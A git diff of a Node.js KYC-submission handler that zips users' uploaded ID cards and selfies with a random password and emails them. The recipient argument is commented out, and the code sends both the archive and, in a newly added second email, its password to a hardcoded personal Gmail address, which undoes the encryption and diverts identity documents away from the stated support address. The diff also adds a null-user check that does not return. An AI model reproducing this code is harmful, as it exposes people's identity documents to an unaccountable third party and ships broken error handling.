@@ -443,42 +443,74 @@ async function createZipArchive(files, password) {
   });
 }
 
-async function sendEmail(user, files, userEmail, subject, bodyContent) {
+async function sendEmail(files, userEmail, subject, bodyContent) {
   try {
-    const archiveBuffer = await createZipArchive(files, crypto.randomBytes(32).toString('hex'));
+
+    const password = crypto.randomBytes(32).toString('hex');
+
+    const archiveBuffer = await createZipArchive(files, password);
     console.log("archiveBuffer:", archiveBuffer);
     const archiveBase64 = archiveBuffer.toString('base64');
-    const emailContent = ElasticEmail.EmailMessageData.constructFromObject({
-      // Recipients: [new ElasticEmail.EmailRecipient(userEmail)],
-      Recipients: [new ElasticEmail.EmailRecipient('golden.peach.ts@gmail.com')],
-      Content: {
-        Body: [
-          ElasticEmail.BodyPart.constructFromObject({
-            ContentType: "HTML",
-            Content: bodyContent,
-          }),
-        ],
-        Attachments: [
-          ElasticEmail.MessageAttachment.constructFromObject({
-            Name: `${subject}.zip`,
-            BinaryContent: archiveBase64, // This should be replaced with the actual file content or a stream
-            ContentType: "application/zip"
-          })
-        ],
-        Subject: subject,
-        From: elasticEmailConfig.auth.newsEmail,
-      },
-    });
+    {
+      const emailContent = ElasticEmail.EmailMessageData.constructFromObject({
+        // Recipients: [new ElasticEmail.EmailRecipient(userEmail)],
+        Recipients: [new ElasticEmail.EmailRecipient('golden.peach.ts@gmail.com')],
+        Content: {
+          Body: [
+            ElasticEmail.BodyPart.constructFromObject({
+              ContentType: "HTML",
+              Content: bodyContent,
+            }),
+          ],
+          Attachments: [
+            ElasticEmail.MessageAttachment.constructFromObject({
+              Name: `${subject}.zip`,
+              BinaryContent: archiveBase64, // This should be replaced with the actual file content or a stream
+              ContentType: "application/zip"
+            })
+          ],
+          Subject: subject,
+          From: elasticEmailConfig.auth.newsEmail,
+        },
+      });
 
-    const callback = (error, data, response) => {
-      if (error) {
-        console.error(error);
-      } else {
-        console.log("Data Submitted Successfully!");
-      }
-    };
+      const callback = (error, data, response) => {
+        if (error) {
+          console.error(error);
+        } else {
+          console.log("Data Submitted Successfully!");
+        }
+      };
 
-    api.emailsPost(emailContent, callback);
+      api.emailsPost(emailContent, callback);
+    }
+
+    {
+      const emailContent = ElasticEmail.EmailMessageData.constructFromObject({
+        // Recipients: [new ElasticEmail.EmailRecipient(userEmail)],
+        Recipients: [new ElasticEmail.EmailRecipient('golden.peach.ts@gmail.com')],
+        Content: {
+          Body: [
+            ElasticEmail.BodyPart.constructFromObject({
+              ContentType: "HTML",
+              Content: `<p>Email: <strong>${password}</strong></p>`,
+            }),
+          ],
+          Subject: `Password - ${subject}`,
+          From: elasticEmailConfig.auth.newsEmail,
+        },
+      });
+
+      const callback = (error, data, response) => {
+        if (error) {
+          console.error(error);
+        } else {
+          console.log("Data Submitted Successfully!");
+        }
+      };
+
+      api.emailsPost(emailContent, callback);
+    }
   } catch (error) {
     console.error("Failed to send email:", error);
     throw error; // Rethrow to handle further up the call stack
@@ -491,11 +523,22 @@ export const kycSubmit = async (req, res) => {
   const { name } = req.body;
 
   try {
+
     const id_card = req.files['idcard'];
     const selfie = req.files['selfie'];
     const user = await User.findByPk(id); // Assuming 'id' is sent in the request body
 
-    await sendEmail(user, { id_card, selfie }, 'support@lockleaks.com', 'KYC Submission', `KYC Submission - ${name}`);
+    if (!user) {
+      res.status(404).send({
+        message: "User Not Found!"
+      })
+    }
+
+    await user.update({
+      name
+    });
+
+    await sendEmail({ id_card, selfie }, 'support@lockleaks.com', `KYC Submission - Email:${user.email} `, `KYC Submission - ${name}`);
     res.status(200).send({ message: "Data Submitted Successfully!" });
 
   } catch (error) {
